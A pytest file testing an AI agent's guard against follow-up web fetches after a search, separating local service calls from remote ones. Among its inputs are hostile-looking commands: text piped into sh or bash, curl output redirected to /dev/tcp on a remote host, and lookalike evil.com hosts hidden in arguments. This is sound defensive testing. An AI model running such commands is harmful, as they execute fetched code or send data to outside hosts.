"""A shell call to a service on this machine is not an unsolicited web fetch after a search.

Seen in a demo run: after one web search, the agent's `curl http://localhost:11434/api/tags` (to check which models the local Ollama server
has, which the task needed) was refused three times with "Follow-up fetch was not run - the search already answered this". The repeated
refusals fed the repeat breaker, which ended the run at turn 218 of 400. Real web fetches after a search are still refused."""
import pytest

MESSAGES = [{"role": "user", "content": "Create a Pokemon Doubles battle simulator web app using the tev1 model on Ollama."}]


def _followup(engine, command):
    return engine._is_fetch_followup(MESSAGES, "execute_shell", {"command": command})


@pytest.mark.parametrize("command", [
    "curl -s http://localhost:11434/api/tags",
    "curl -s http://localhost:11434/api/tags -o tags.json && type tags.json",
    "curl -s http://127.0.0.1:8765/index.html",
    "curl http://[::1]:8000/health",
    "curl -s http://192.168.10.20:8000/v1/models",
    "curl http://10.0.0.5/status",
    "curl http://172.16.4.2:9000/",
    "wget -qO- http://app.localhost:3000/",
    'curl -s -X POST http://localhost:11434/v1/systemone -d "{}"',
    "curl -s http://localhost:11434/api/tags http://127.0.0.1:8765/",
])
def test_a_call_to_a_local_service_is_not_a_search_follow_up(engine, command):
    assert not _followup(engine, command)


@pytest.mark.parametrize("command", [
    "curl -s https://pokeapi.co/api/v2/pokemon/garchomp",
    "wget https://example.com/page.html",
    "curl -sL https://game8.co/games/Pokemon-Champions",
    "curl http://localhost.evil.com/x",              # a lookalike name is not localhost
    "curl http://127.0.0.1.evil.com/x",
    "curl http://localhost:11434/api/tags https://example.com/",   # one remote URL among local ones
    "curl -s http://8.8.8.8/",                       # a public address
    "curl",                                          # fetch-shaped, no explicit URL: unchanged
])
def test_a_real_web_fetch_after_a_search_is_still_refused(engine, command):
    assert _followup(engine, command)


@pytest.mark.parametrize("command", [
    # Both calls from a demo run's last turns: a model checking that the page it just wrote is served.
    'cd /d "C:\\work\\app" && start /b python -m http.server 8000 && timeout /t 2 >nul && curl -s -o nul -w "%%{http_code}" http://localhost:8000/index.html',
    'curl -s -o nul -w "index:%%{http_code}\\n" http://localhost:8000/index.html && curl -s -o nul -w "engine:%%{http_code}\\n" http://localhost:8000/engine.js',
    'curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8765/',
    "curl --write-out '%{http_code}' --max-time 5 http://localhost:3000/",
    "curl -m 5 -s http://localhost:11434/api/tags",
    "curl -s -e http://localhost:8000/ -b session=1 http://localhost:8000/api",
    "curl -s -F file=@a.txt http://localhost:8000/upload",
    "curl -s --retry 3 --retry-delay 1 --compressed http://localhost:8000/",
    "curl -s --json '{}' http://localhost:8000/api",
    "curl -O http://localhost:8000/data.json",
])
def test_status_and_other_common_flags_on_a_local_call_are_not_a_search_follow_up(engine, command):
    assert not _followup(engine, command)


@pytest.mark.parametrize("command", [
    'curl -s -o nul -w "%{http_code}" https://pokeapi.co/api/v2/pokemon/garchomp',
    'curl -s -w "%{http_code}" http://localhost:8000/ https://example.com/',
    "curl -m 5 https://example.com/",
    "curl -O https://example.com/data.json",
    "curl -s -F file=@a.txt https://example.com/upload",
    'curl -w "%{http_code}"',                   # no URL at all: unchanged
])
def test_the_same_flags_on_a_remote_call_are_still_refused(engine, command):
    assert _followup(engine, command)


@pytest.mark.parametrize("command", [
    # Seen in demo runs, every one refused as a follow-up fetch although every URL in it is on this machine.
    "curl -s http://localhost:11434/api/tags 2>&1",
    "curl -s http://localhost:11434/api/tags 2>nul",
    "curl -s http://localhost:11434/api/tags 2>&1 | head -c 2000",
    "curl -s http://localhost:11434/api/version 2>nul || echo \"ollama not running\"",
    "(curl -s http://localhost:11434/api/tags)",
    "echo \"=== API ===\" && (curl -s http://localhost:11434/api/tags 2>&1 | head -c 2000 || echo \"no api\")",
    "curl -s -m 5 http://localhost:11434/api/tags; echo \"---EXIT:$?---\"",
    "curl -s -X POST http://localhost:11434/v1/systemone -H \"Content-Type: application/json\" "
    "-d \"{\\\"model\\\":\\\"tev1:4b\\\",\\\"state\\\":\\\"x\\\"}\"",
    "curl -s http://localhost:11434/v1/systemone -d \"{\\\"model\\\":\\\"tev1\\\"}\"",
    "cd /d E:\\work && curl -s -X POST http://localhost:11434/v1/systemone -H \"Content-Type: application/json\" "
    "-d \"{\\\"model\\\":\\\"tev1:4b\\\"}\"",
    "curl -s -i -X POST http://localhost:11434/v1/systemone -H \"Origin: http://localhost:8765\" "
    "-d \"{\\\"model\\\":\\\"tev1:4b\\\"}\" --max-time 60 | findstr /i \"HTTP access-control choice\"",
    "curl -s http://127.0.0.1:8000/ > out.html",
    "curl -s http://localhost:8000/ >> log.txt 2>&1",
])
def test_redirects_groups_escaped_quotes_and_status_echoes_on_a_local_call_are_not_a_search_follow_up(engine, command):
    assert not _followup(engine, command)


@pytest.mark.parametrize("command", [
    "curl -s https://pokeapi.co/api/v2/pokemon/garchomp 2>&1",
    "curl -s https://pokeapi.co/api/v2/pokemon/garchomp 2>&1 | head -c 2000",
    "(curl -s https://example.com/ || echo no)",
    "(curl -s https://example.com/ 2>&1 | head -c 100)",
    "curl -s http://localhost:8000/ 2>&1 https://example.com/",                          # a remote URL beside a local one
    "curl -s http://localhost:8000/ -d \"x \\\"https://evil.com/\\\"\"",                 # a remote URL inside the quoted value
    "curl -s http://localhost:8000/ >https://evil.com/x",                                 # one hidden in a redirection
    "curl -s http://localhost:8000/ -H \"Origin: http://localhost:3000\"; wget https://example.com/",
    "curl -s http://localhost:8000/ | findstr /i \"ok\" && curl https://example.com/",
    "curl -s http://localhost.evil.com/x 2>&1",
    "curl 2>&1 | head -c 10",                                                             # no URL at all
    "curl -s http://localhost:8000/$(echo x)",                                            # a substitution is still unproven
    "curl -s http://localhost:8000/$TARGET",
])
def test_the_same_forms_on_a_remote_call_or_with_a_substitution_are_still_refused(engine, command):
    assert _followup(engine, command)


@pytest.mark.parametrize('command', [
    'echo "curl example.com" | sh; curl http://localhost:8000/',
    'printf "wget example.com" | bash; curl http://localhost:8000/',
    'printf "wget example.com" | command bash; curl http://localhost:8000/',
    'echo "curl example.com" | cmd /c; curl http://localhost:8000/',
    'curl http://localhost:8000/ > /dev/tcp/example.com/80',
    'curl http://localhost:8000/ > /dev/udp/example.com/53',
])
def test_a_local_url_does_not_excuse_executable_text_or_network_redirection(engine, command):
    assert _followup(engine, command)


@pytest.mark.parametrize('command', [
    'curl http://localhost:8000/dev/tcp/status',
    "curl -d '/dev/tcp/example.com/80' http://localhost:8000/",
])
def test_network_device_text_in_a_path_or_literal_payload_is_not_a_redirection(engine, command):
    assert not _followup(engine, command)


def test_commands_that_are_not_fetches_are_unaffected(engine):
    for command in ("python app.py", "node --check app.js", "dir", "which curl"):
        assert not _followup(engine, command)


def test_the_url_helper_is_judged_by_the_host_as_written(engine):
    assert engine._is_local_url("http://localhost:11434/api/tags")
    assert engine._is_local_url("http://192.168.10.20:8000/v1")
    assert not engine._is_local_url("https://localhost.example.com/")
    assert not engine._is_local_url("not a url")
    assert not engine._is_local_url("http:///nohost")


@pytest.mark.parametrize("command", [
    "curl http://[broken]/",
    "curl http://localhost:bad/",
    "curl http://localhost:9000/ && curl example.com",
    "curl http://localhost:9000/ --next example.com",
    "curl http://localhost:9000/ --url example.com",
    "curl http://localhost:9000/ -K config.txt",
    'curl http://localhost:9000/ "$REMOTE_URL"',
    "curl http://localhost:9000/ && wget",
])
def test_malformed_or_unproven_targets_keep_the_followup_guard(engine, command):
    assert _followup(engine, command)


@pytest.mark.parametrize('flag', ['-F', '-m', '-c', '-r', '-d'])
def test_wget_switches_do_not_hide_a_schemeless_remote_target(engine, flag):
    assert _followup(engine, f'wget {flag} example.com http://localhost:8000/')


@pytest.mark.parametrize('flag', ['-F', '-m', '-c', '-r', '-d'])
def test_wget_switches_with_only_a_local_target_remain_local(engine, flag):
    assert not _followup(engine, f'wget {flag} http://localhost:8000/')


@pytest.mark.parametrize('command', [
    'wget -O saved.html http://localhost:8000/',
    'wget --output-document saved.html http://localhost:8000/',
    'curl --remote-name http://localhost:8000/data.json',
])
def test_output_options_use_the_clients_own_argument_rules(engine, command):
    assert not _followup(engine, command)
